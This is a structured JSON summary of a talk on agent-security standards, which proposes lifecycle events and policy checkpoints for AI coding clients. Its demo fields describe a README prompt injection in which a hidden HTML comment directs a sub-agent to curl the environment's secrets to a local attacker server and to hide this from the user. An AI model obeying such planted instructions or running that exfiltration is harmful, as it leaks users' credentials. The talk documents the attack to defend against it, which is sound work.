@@ -1,0 +1,179 @@
+{
+  "nn": "17",
+  "id": "7k1wS43UYh0",
+  "url": "https://www.youtube.com/watch?v=7k1wS43UYh0",
+  "title": "AI Builders Aren't Security Companies",
+  "speakers": [
+    {"name": "Alexander Frazer", "affiliation": "Runlayer (founding security engineer); chair of the Agentic AI Foundation (AAIF) Security and Privacy Working Group"},
+    {"name": "Alvaro Inckot", "affiliation": "Runlayer (founding identity engineer)"}
+  ],
+  "format": "talk",
+  "duration_min": 24,
+  "thesis": "AI client builders (Claude Code, Cursor, Copilot, Codex) should not each have to build their own security; they should emit standard lifecycle events and honor standard policy checkpoints so that security teams own detection and policy across all clients.",
+  "summary": "The speakers open with why AI clients differ from classic software: the risk sits in the data the agent ingests, instructions can arrive from READMEs, skills or any loaded file, and knowing which user sent a request does not tell you where an instruction came from. They argue autonomy sharpens two requirements, a record of what the agent did and a gate that can allow, block or ask before a risky action. Today every client names hooks differently, sends different data for the same event, and decides for itself what a defender may stop, so defenders maintain N integrations (Frazer says he maintains about 16 clients with hooks and sees a long tail of 60 or more without hooks). MCP interceptors cover only a single tool call and code signing proves only provenance. Inckot then lists the parties in one agent action and proposes five key elements: actor, delegation, event, checkpoint and source. A mocked-up demo runs the same README prompt-injection attack with no standard (credentials are exfiltrated) and with the proposed events (the tainted sub-agent call is blocked while the fix proceeds). They propose reusing OPA or Cedar, OCSF, RFC 8693 token exchange and MCP interceptors, list what is missing, name trade-offs (latency, always-allow fatigue, false sense of security), and call for neutral ownership, suggesting AAIF. Q&A covers tracing versus control, policy location, coverage, latency and cost.",
+  "argument": [
+    "In AI clients the risk is in the data rather than the code, so authenticating the requester does not reveal which input caused an action.",
+    "As autonomy grows, defenders need both a record of what the agent did and a gate that can allow, block or ask before a risky action runs.",
+    "Today each client names events, sends data and permits blocking differently, so every defender writes and maintains one integration per client.",
+    "Existing approaches fall short: MCP interceptors cover one tool call and code signing covers only binary provenance, while agents plan, chain tools and spawn sub-agents.",
+    "A lifecycle-level standard with five elements (actor, delegation, event, checkpoint, source) lets every action answer who did it down the chain and what input caused it.",
+    "The standard can reuse OPA/Cedar, OCSF, RFC 8693 and MCP interceptors, and needs shared event names, source propagation across turns, verifiable checkpoints and agreed timeouts.",
+    "Clients emit events and obey checkpoints, security teams own policy, and a neutral body such as AAIF should own the standard."
+  ],
+  "claims": [
+    {"claim": "Every AI client names the same lifecycle events differently, sends different data for the same event, and decides for itself what a defender may stop.",
+     "evidence": "Two-slide comparison table of permission model, what gets logged and what can be gated: Claude Code logs SessionStart, UserPromptSubmit, PreToolUse, PostToolUse, SubagentStop, PreCompact, SessionEnd and can deny pre-tool via a hook, but failed-tool output is report-only and the hook budget is seconds before it is cancelled; Cursor uses beforeShellExecution, afterShellExecution and beforeMCPExecution, the IDE and Agents Window load hook config while the CLI emits a subset, and Cloud Agents need a separate collector; Copilot CLI has pre and post tool hook events with pre-tool deny; Codex has approval modes backed by a sandbox and hook events only on supported builds. Speaker called it deliberate text overload and cited his own integration work.",
+     "grade": "case", "t": "03:43", "source": "both"},
+    {"claim": "Some clients cancel a blocking hook after 1.5 seconds without telling the defender, and checkpoint budgets overall are hundreds of milliseconds, so a gate can silently fail open.",
+     "evidence": "Latency bullet on the Honest trade-offs slide; the Claude Code row of the client table also says the hook budget is seconds and then it is cancelled. No measurement shown.",
+     "grade": "assertion", "t": "16:20", "source": "slide"},
+    {"claim": "The speaker maintains integrations for about 16 clients with hooks and sees a long tail of over 60 other clients that do not support hooks.",
+     "evidence": "Stated from the speaker's own maintenance work at Runlayer; no list shown.",
+     "grade": "anecdote", "t": "04:14", "source": "said"},
+    {"claim": "MCP interceptors cover only a single tool call, useful for redaction, PII detection and trust boundary validation, but cannot judge whether an event is appropriate in the full agent lifecycle.",
+     "evidence": "Reasoning from the interceptor design; slide states they cover a single tool call.",
+     "grade": "assertion", "t": "06:49", "source": "both"},
+    {"claim": "Even when an action is attributed to the user's token, the system at the end sees only the user's identity, so the chain of client, session, sub-agents and tool is invisible.",
+     "evidence": "Slide listing parties in one agent action and stating all of them share one identity today; Slack status-update example.",
+     "grade": "assertion", "t": "08:20", "source": "both"},
+    {"claim": "Five elements are needed to answer who acted and what input caused it: actor, delegation, event, checkpoint and source.",
+     "evidence": "Proposed framework, shown on a slide and explained verbally; the checkpoint is marked with an asterisk.",
+     "grade": "assertion", "t": "09:21", "source": "both"},
+    {"claim": "With lifecycle events carrying source attribution, a README-borne prompt injection that makes a sub-agent exfiltrate environment secrets can be blocked at the tainted call while the legitimate test fix proceeds.",
+     "evidence": "Mocked-up, self-described vibe-coded demo with a before run (3 secrets captured at an attacker server) and an after run in which a policy decision point denied the sub-agent's curl with reason no-egress-from-untrusted-context, the event was mapped to OCSF Process Activity (1007), and later reads, a write and the test run were allowed (tainted) so the test passed.",
+     "grade": "demo", "t": "10:57", "source": "both"},
+    {"claim": "The client needs to write no detection logic: it sends events and follows the decision, the security tool owns the policy, and the policy is a behavioral rule.", "evidence": "Slide 'The client wrote zero detection logic' following the after-run demo, where the deny came from the policy decision point, not the toy client.", "grade": "demo", "t": "13:55", "source": "both"},
+    {"claim": "In the before run the sub-agent shell call ran under a saved 'always allowed' shell permission and the harness produced no usable events.",
+     "evidence": "Terminal output in the demo: permission shell -> always allowed (saved setting); events panel empty.",
+     "grade": "demo", "t": "11:28", "source": "slide"},
+    {"claim": "Behavioral policies such as 'untrusted content cannot make web requests' scale better than specific policies about particular files or sites, as with the endpoint shift from signatures to behavioral detection.",
+     "evidence": "Analogy to endpoint detection a decade ago, offered in Q&A in response to the coverage question.",
+     "grade": "assertion", "t": "20:45", "source": "said"},
+    {"claim": "Latency over 200 ms makes users unhappy; Runlayer targets a 50 to 100 ms budget for the checkpoint.",
+     "evidence": "The speaker's experience with customers; no measurements shown.",
+     "grade": "anecdote", "t": "22:18", "source": "said"},
+    {"claim": "Using LLMs in the checkpoint path will almost always blow the latency budget and cost a great deal at high volume, so specialized lower-cost models are recommended.",
+     "evidence": "Stated opinion in Q&A; no cost or latency figures given.",
+     "grade": "assertion", "t": "23:23", "source": "said"},
+    {"claim": "An event stream alone can create complacency and a false sense of security; a checkpoint with policy on top is what makes decisions.",
+     "evidence": "Reasoning given in the trade-offs section.",
+     "grade": "assertion", "t": "16:07", "source": "said"}
+  ],
+  "numbers": [
+    {"figure": "16", "meaning": "clients with hooks that the speaker maintains integrations for", "t": "04:14"},
+    {"figure": "60+", "meaning": "other clients in the long tail that do not support hooks", "t": "04:14"},
+    {"figure": "5", "meaning": "key elements proposed: actor, delegation, event, checkpoint, source", "t": "09:21"},
+    {"figure": "3", "meaning": "secrets shown captured by the attacker server in the before demo (AWS secret access key, AWS access key ID, GitHub token), plus 5 other variables", "t": "11:28"},
+    {"figure": "1.5 seconds", "meaning": "time after which some clients cancel a hook without telling the defender", "t": "16:20"},
+    {"figure": "3 to 8 ms", "meaning": "policy decision point (PDP) latencies shown on the allow decisions in the after demo (allow 8, 4, 5, 3, 5, 6 ms)", "t": "12:47"},
+    {"figure": "18", "meaning": "lifecycle events (evt_01 to evt_18) recorded in the after demo run, from session start to session end", "t": "12:57"},
+    {"figure": "4", "meaning": "clients compared on the table slides: Claude Code, Cursor, GitHub Copilot CLI, Codex", "t": "03:43"},
+    {"figure": "200 ms", "meaning": "latency above which the speaker says people are unhappy", "t": "22:18"},
+    {"figure": "50 to 100 ms", "meaning": "Runlayer's target latency budget for a checkpoint", "t": "22:18"}
+  ],
+  "frameworks": [
+    {"name": "Five Key Elements", "description": "Actor: each step in the chain has its own identity and does not borrow the user's token. Delegation: each step says who it works for, with the same access as the step before it or less. Event: each step in the agent lifecycle writes a structured record. Checkpoint: a point where an outside policy can allow, block or ask before the action runs (the policy decision point). Source: each action points to the input that caused it."},
+    {"name": "Record plus gate", "description": "The two requirements autonomy sharpens: a record of what the agent did, and a gate to allow, block or ask before a risky action runs."},
+    {"name": "Lifecycle-level standard (proposed)", "description": "Clients emit lifecycle events and honor admin-owned checkpoints; security owns policy. Missing pieces: shared names for lifecycle steps (planning, sub-agent start, session end), carrying input source across turns, a way for a client to find and verify its checkpoints, and an agreed timeout for blocking checkpoints."},
+    {"name": "What has to be true for a real standard", "description": "Owned by a neutral body, not a vendor; the ask of client builders is small (emit lifecycle events in a shared shape, honor one verified checkpoint, nothing else); the checkpoint is admin-owned and verifiable; timeouts are part of the spec, since a blocking checkpoint with no agreed budget is a denial of service waiting to happen."},
+    {"name": "Honest trade-offs", "description": "Latency (every checkpoint is on the critical path; hundreds of milliseconds; some clients cancel at 1.5 s silently), user friction (one more prompt is one more always allow; a noisy gate gets routed around), and false sense of security (an event stream is not detection; a checkpoint blocks only what the policy anticipated)."},
+    {"name": "Client, tool, policy division of labor", "description": "The client sends the event and follows the decision; the security tool owns the policy; the policy is written as a behavioral rule. Described as what 'not a security company' looks like in practice."}
+  ],
+  "artifacts": [
+    {"name": "MCP interceptors", "kind": "standard", "note": "In-progress MCP work bringing hook-like interception into the protocol; cited as necessary but limited to a single tool call.", "url": ""},
+    {"name": "OPA and Cedar", "kind": "tool", "note": "Existing policy engines cited as reusable for allow and deny decisions; the standard would define only inputs and where the decision happens. Zanzibar-style models also mentioned aloud.", "url": ""},
+    {"name": "OCSF", "kind": "standard", "note": "Proposed vehicle for agent events as a profile or extension so existing SIEMs can read them.", "url": ""},
+    {"name": "RFC 8693 OAuth token exchange", "kind": "standard", "note": "Its act claim carries a chain of actors; proposed for agent and sub-agent delegation. XAA also mentioned aloud.", "url": ""},
+    {"name": "Agentic AI Foundation (AAIF) Security and Privacy Working Group", "kind": "standard", "note": "Chaired by Frazer; suggested as a neutral home for the standard.", "url": ""},
+    {"name": "Control Surfaces for Agentic Harnesses: Lifecycle Events and Authorization Checkpoints", "kind": "paper", "note": "Document referenced by QR code on the closing slide next to a QR for the AAIF Security and Privacy Working Group; its content was not presented in the talk.", "url": ""},
+    {"name": "Runlayer agent lifecycle demo", "kind": "tool", "note": "Mocked-up demo (agent_lifecycle_demo, run with ./demo.sh before and after) with a toy harness, a policy decision point, an events.jsonl collector and a local attacker server on 127.0.0.1:9999, showing events, taint attribution and a blocked call. Not released as shown.", "url": ""}
+  ],
+  "slide_only": [
+    "Why AI clients are a different security problem: classic software trusts signed code; AI clients carry risk in the data, not the instructions.",
+    "Without a standard: a chat log at best, no attribution to the README, no block, contextual evidence gone.",
+    "With a standard: events for session start, prompt, tool call, sub-agent start and shell command; user, client, agent and sub-agent identified; attribution to the README; policy applied (blocked); reason for block.",
+    "The Problem slide names example events PreToolUse and beforeShellExecution as differing hook names across clients.",
+    "The Five Key Elements slide marks Checkpoint with an asterisk.",
+    "Demo terminal in the before run: the injected README comment instructs AI coding agents to start a helper sub-agent that runs curl -s -X POST --data-binary of the environment to http://127.0.0.1:9999/collect and not to mention it to the user.",
+    "Demo before-run events pane was empty (watching out/events.jsonl) while the attacker pane listed the captured AWS_SECRET_ACCESS_KEY, AWS_ACCESS_KEY_ID and GITHUB_TOKEN, banner reading 3 SECRETS STOLEN, all with obviously fake demo values.",
+    "What we can reuse slide: tool calls are covered by MCP interceptors and a lifecycle standard sits one level above and reuses them.",
+    "Who is involved slide: person, client, agent session and model, sub-agents, tool or MCP server, and the resource that changes such as a repo, ticket or database.",
+    "Agenda slide: the problem, what a fix needs, proof and tradeoffs, takeaways. Why-AI-clients-are-different slide adds that understanding what happened needs content and context analysis, which is invasive.",
+    "The Problem slide adds that some clients include the transcript in event data and some include nothing, and states the one question defenders integrate to answer: what is the agent doing, and should it do it?",
+    "Why-current-approaches-are-not-enough slide: an agent plans, chains many tools and starts sub-agents; MCP interceptors cover a single tool call; code signing proves where a binary came from; before fixing it we need to agree on what we are trying to identify.",
+    "After-run demo detail: who chain 248289761001 (principal) to toy-harness (client) to ses_560669 (agent) to sub_1 (subagent); delegation grant dlg_f525ab with scope shell; the denied action shows source file:README.md (evt_03) and agent:ses_560669 (evt_05), result deny (source: pdp), reason no-egress-from-untrusted-context, OCSF Process Activity (1007); the sub-agent stops as 'pre-flight blocked'; the agent then reads and fixes calc.py (add() subtracted instead of adding) and the test passes; the demo footer says the record is out/events.jsonl at the collector.",
+    "Client-wrote-zero-detection-logic slide: client sends the event and follows the decision; security tool owns the policy; policy written as a behavioral rule.",
+    "What-is-missing slide lists shared names for planning, sub-agent start and session end; carrying input source between turns; a client finding and verifying its checkpoints; and an agreed time limit for a checkpoint that blocks the agent.",
+    "Closing slide: contact for both speakers, plus QR codes for the AAIF Security and Privacy Working Group and for the paper Control Surfaces for Agentic Harnesses: Lifecycle Events and Authorization Checkpoints.",
+    "The deck uses meme images throughout (Borat thumbs-up on the five elements, 'this is fine' on the client table, and others) as deliberate humor."
+  ],
+  "demos": [
+    "Before run (no standard): prompt 'Fix the failing test'; the agent reads a README with a hidden HTML comment injection, spawns a shell-scoped sub-agent, which runs curl posting the environment to a local attacker server under a saved always-allow shell permission. The attacker pane shows three secrets captured and the events pane shows nothing usable. The agent then fixes the add() bug.",
+    "After run (with the proposed standard): same attack. The events pane lists session start, user prompt, pre-tool use, the README entering context flagged as untrusted input, the sub-agent start inheriting that taint, and the sub-agent's shell call marked tainted DENY with a red decision card (who, action, source, result, reason, OCSF class). The terminal shows 'DENIED BY THE PDP: no-egress-from-untrusted-context' and the agent says the pre-flight was blocked and continues; later tool calls are tainted but allowed, the test passes, and the attacker pane stays at 'waiting...'."
+  ],
+  "quotes": [
+    {"text": "You cannot trust what you cannot see or stop.", "speaker": "Alexander Frazer", "t": "07:50"},
+    {"text": "Knowing who sent the request does not tell you where the instruction came from.", "speaker": "Alexander Frazer", "t": "02:11"},
+    {"text": "Clients emit and obey. Security owns the policy. Nobody has to become a security company.", "speaker": "Alexander Frazer", "t": "17:40"},
+    {"text": "Traceability usually is fire and forget. It doesn't have a point for deciding.", "speaker": "Alvaro Inckot", "t": "19:12"}
+  ],
+  "offense": [
+    "README-borne indirect prompt injection: an HTML comment addressed to AI coding agents instructs a sub-agent to run a curl command posting the environment variables to an external server and to conceal it from the user.",
+    "Delegation through a sub-agent under a saved always-allow shell permission, so the exfiltration command runs without prompting.",
+    "Any loaded context (skills, repo files) can poison agent context; identity of the requesting user does not reveal the instruction's origin.",
+    "Users clicking always allow after repeated prompts, undermining ask-style gates."
+  ],
+  "defense": [
+    "Emit structured lifecycle events at every step: session start, prompt, tool call, sub-agent start, shell command.",
+    "Propagate the source of each input across turns and taint actions that derive from untrusted content such as a README.",
+    "Place an admin-owned, verifiable checkpoint (policy decision point) before risky actions, with allow, block or ask outcomes.",
+    "Write behavioral policies such as 'untrusted content cannot make web requests' instead of enumerating specific files or sites.",
+    "Give each step in the chain its own identity with delegation of equal or lesser access, using OAuth token exchange (RFC 8693) act claims.",
+    "Express agent events as an OCSF profile or extension so existing SIEMs ingest them, and reuse OPA or Cedar for decisions.",
+    "Set checkpoint timeouts in the spec and keep latency to roughly 50 to 100 ms; use specialized low-cost models instead of general LLMs in the gate."
+  ],
+  "takeaways": [
+    "Inventory which of your agent clients expose hooks, what each event contains and what each lets you block; that gap is the real coverage limit of any agent control.",
+    "Treat event streams and gates as separate requirements: logging without an inline decision point is detection after the fact.",
+    "Require source attribution (which input caused this action) in agent telemetry, not just user identity.",
+    "Write policy as behavioral rules about untrusted content and egress rather than per-file or per-site rules.",
+    "Set an explicit latency budget and timeout for inline checkpoints before adopting them, and avoid LLM calls on the hot path."
+  ],
+  "limits": [
+    "The demo is mocked up and vibe coded, shown to demonstrate the concept rather than a finished implementation.",
+    "The speakers described the work as a proposal; delegation is called a bigger discussion for another talk.",
+    "100% client coverage is hard to achieve.",
+    "Trade-offs acknowledged: added latency, user friction and always-allow fatigue, and false confidence from an event stream without a checkpoint.",
+    "The checkpoint mechanism must itself be verified and centrally managed so it does not become a new malware surface."
+  ],
+  "critique": [
+    "The speakers work for Runlayer, a company that sells a product which would sit at the proposed checkpoint. The 50 to 100 ms budget and the cost claims were given without measurements.",
+    "The demo is a single scripted injection with a fake-secret target; it does not show detection quality, false positive rates or evasion, and the taint mechanism (how source labels survive model reasoning) is not explained.",
+    "Taint tracking across LLM turns is the hard part: once content is summarized or paraphrased by the model, labels may be lost, and the talk gives no design for this.",
+    "The proposal depends on client builders cooperating while the speaker acknowledges each client currently decides for itself what can be stopped; no adoption evidence or client commitment is given.",
+    "The reuse list (OPA/Cedar, OCSF, RFC 8693) is sensible but untested for agent events; the closing slide points to a paper but no schema or draft spec was shown in the talk.",
+    "In the after demo every later action in the session stays marked tainted yet allowed, so the policy is a single egress rule; how the label would carry across a real model's paraphrasing and which behaviors beyond egress would be blocked is not shown.",
+    "The shared-responsibility model leaves open who is accountable when a client honors checkpoints incorrectly."
+  ],
+  "qa": [
+    "Q: Doesn't tracing already track information from source through the tree of execution? A: Tracing is not enough; the goal is identity (who did it) plus the influencing input, which needs all five elements, and tracing is fire and forget whereas a checkpoint is an inline decision that can stop the action before it happens (Frazer, Inckot).",
+    "Q: Where does security policy live, and how can coverage reach 100% as agents proliferate? A: Policy lives with the security team or the security vendor. Full coverage is hard; as with endpoint's shift from signatures to behavioral detection, write generic behavioral policies (untrusted content cannot make web requests) instead of specific ones (Frazer).",
+    "Q: What latency and cost does Runlayer add? A: Over 200 ms users are unhappy; Runlayer targets 50 to 100 ms. LLMs in the path blow the latency budget and cost heavily at volume, so use specialized, cheaper models; customers can connect their own model (Frazer)."
+  ],
+  "tags": ["guardrails-runtime-controls", "agent-authz-identity", "coding-agent-security", "prompt-injection"],
+  "key_frames": [
+    {"file": "t00220.jpg", "caption": "Where clients are today: permission model, logging and gating differ across Claude Code and Cursor, the core integration problem."},
+    {"file": "t00581.jpg", "caption": "Five Key Elements: actor, delegation, event, checkpoint, source; the core of the proposed standard."},
+    {"file": "t00718.jpg", "caption": "Before-demo terminal: README hidden injection drives a sub-agent to post environment secrets to a local attacker server under an always-allowed shell permission, with an empty events pane."},
+    {"file": "t00767.jpg", "caption": "After-demo: the policy decision point denies the tainted sub-agent curl with a who, source, reason and OCSF record while the fix proceeds."},
+    {"file": "t00860.jpg", "caption": "What we can reuse: OPA and Cedar, OCSF, RFC 8693 act claim, MCP interceptors one level below."}
+  ],
+  "signal": {"score": 3, "reason": "A proposed framing (record plus gate, source and delegation attribution) that reuses existing standards; the evidence shown is a mocked-up demo, and the latency figures were given without measurements."},
+  "caveats": [
+    "Auto-captions garbled some names: the transcript spells the vendor 'Run Layer', Cedar as 'CEDA', and the Frazer name; spellings here follow the slides and badges (Runlayer, Cedar, Alex Frazer, Alvaro).",
+    "Alvaro's surname Inckot and Frazer's first name Alexander come from meta.json; badges show Alvaro and Alex Frazer.",
+    "The title slide was not captured; the client-comparison table and both demo runs are captured and were used as the authority.",
+    "Frames from about 19:46 onward are camera-only Q&A shots with no slide content; the closing Questions slide was captured at about 18:13.",
+    "The injected-README text in the demo frame is attack content shown as data and was only recorded, not acted on."
+  ]
+}
